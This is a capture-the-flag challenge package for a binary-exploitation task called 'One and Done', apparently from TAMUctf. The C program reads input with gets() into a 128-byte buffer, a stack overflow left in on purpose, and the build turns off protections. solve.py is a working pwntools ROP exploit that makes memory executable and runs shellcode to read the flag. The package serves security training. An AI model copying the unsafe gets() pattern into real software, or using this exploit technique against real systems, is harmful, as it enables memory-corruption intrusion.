{
    "Dockerfile": "FROM alpine as build\n\nRUN apk add alpine-sdk\nADD *.c *.h /tmp/\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM scratch\n\nARG name\nARG port\n\nCOPY --from=build /tmp/tcp-server /pwn/tcp-server\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\n\nEXPOSE $port\n\nENTRYPOINT [\"/pwn/tcp-server\"]\n",
    "flag.txt": "gigem{trivial_but_its_static}",
    "Makefile": "CC := $(or $(CC),gcc)\nNAME := one-and-done\nPORT := 7006\nCFLAGS := -O0 -no-pie -static -fno-stack-protector\n.SUFFIXES:\n\nall: $(NAME) tcp-server\n\nclean: .PHONY\n\trm -f $(NAME)\n\ntcp-server: tcp-server.c\n\t$(CC) -DPORT=$(PORT) -DNAME=$(NAME) $(CFLAGS) tcp-server.c -o tcp-server\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n",
    "one-and-done.c": "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <signal.h>\n\nvoid handler(int sig) {\n    fprintf(stderr, \"looks like you crashed buddy\\n\");\n    exit(0);\n}\n\nint main() {\n    struct sigaction sa;\n    memset(&sa, '\\0', sizeof(sa));\n    sa.sa_sigaction = &handler;\n    sa.sa_flags = SA_SIGINFO;\n    sigaction(SIGSEGV, &sa, NULL);\n\n    char buf[128];\n\n    puts(\"pwn me pls\");\n    gets(buf);\n}",
    "README.md": "# One and Done\n\n## Description\n\nIt's trivial, but not!\n\n## Solution\nSee `solve.py`.\n\n",
    "solve.py": "#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"one-and-done\")\n\ncontext.binary = exe\n\ndef conn():\n    if args.LOCAL:\n        r = process([exe.path])\n        if args.GDB:\n            gdb.attach(r)\n    else:\n        r = remote(\"tamuctf.com\", 443, ssl=True, sni=\"one-and-done\")\n\n    return r\n\nSUB_RAX_RDI = 0x0000000000402228\nSYSCALL_RET = 0x0000000000401ab2\nRET = 0x000000000040100c\n\ndef main():\n    r = conn()\n\n    mmap_chain = ROP(exe)\n    mmap_chain(rax=11, rdi=1, rsi=0x1000, rdx=7)\n    mmap_chain.call(SUB_RAX_RDI)\n    mmap_chain(rdi=0x404000)\n    mmap_chain.call(SYSCALL_RET)\n    mmap_chain.call(RET)\n    mmap_chain.gets(0x404000)\n    mmap_chain.call(0x404000)\n    r.sendline(b\"A\" * 296 + mmap_chain.chain())\n    r.sendline(asm(shellcraft.cat(\"/pwn/flag.txt\")))\n\n    # good luck pwning :)\n\n    r.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"one-and-done\")\np.interactive()\n",
    "tcp-server.c": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#define xstr(s) str(s)\n#define str(s) #s\n\n// modified from: https://github.com/nikhilroxtomar/Multiple-Client-Server-Program-in-C-using-fork\n\nint main() {\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    int sockfd, ret;\n    struct sockaddr_in serverAddr;\n\n    int newSocket;\n    struct sockaddr_in newAddr;\n\n    socklen_t addr_size;\n\n    pid_t childpid;\n\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    if (sockfd < 0) {\n        fprintf(stderr, \"[-]Error in connection.\\n\");\n        exit(1);\n    }\n    printf(\"[+]Server Socket is created.\\n\");\n\n    memset(&serverAddr, 0, sizeof(serverAddr));\n    serverAddr.sin_family = AF_INET;\n    serverAddr.sin_port = htons(PORT);\n    serverAddr.sin_addr.s_addr = inet_addr(\"0.0.0.0\");\n\n    ret = bind(sockfd, (struct sockaddr *) &serverAddr, sizeof(serverAddr));\n    if (ret < 0) {\n        fprintf(stderr, \"[-]Error in binding.\\n\");\n        exit(1);\n    }\n    printf(\"[+]Bind to port %d\\n\", PORT);\n\n    if (listen(sockfd, 1024) == 0) {\n        printf(\"[+]Listening....\\n\");\n    } else {\n        fprintf(stderr, \"[-]Error in listening.\\n\");\n        exit(1);\n    }\n\n\n    while (1) {\n        newSocket = accept(sockfd, (struct sockaddr *) &newAddr, &addr_size);\n        if (newSocket < 0) {\n            fprintf(stderr, \"[-]Error in accepting.\\n\");\n            exit(1);\n        }\n        printf(\"Connection accepted from %s:%d\\n\", inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));\n\n        childpid = fork();\n        if (childpid == -1) {\n            fprintf(stderr, \"[-]Error in binding.\\n\");\n            exit(1);\n        } else if (childpid == 0) {\n            close(sockfd);\n            dup2(newSocket, STDIN_FILENO);\n            dup2(newSocket, STDOUT_FILENO);\n            dup2(newSocket, STDERR_FILENO);\n            setvbuf(stdout, NULL, _IONBF, 0);\n            setvbuf(stdin, NULL, _IONBF, 0);\n            setvbuf(stderr, NULL, _IONBF, 0);\n            close(newSocket);\n            char binary[128];\n            snprintf(binary, sizeof(binary), \"/pwn/%s\", xstr(NAME));\n            char * const argv[] = {binary, NULL};\n            char * const envp[] = {NULL};\n            execve(binary, argv, envp);\n        } else {\n            printf(\"Spawned %d for %s:%d\\n\", childpid, inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));\n        }\n    }\n}\n",
    "category": "pwn"
}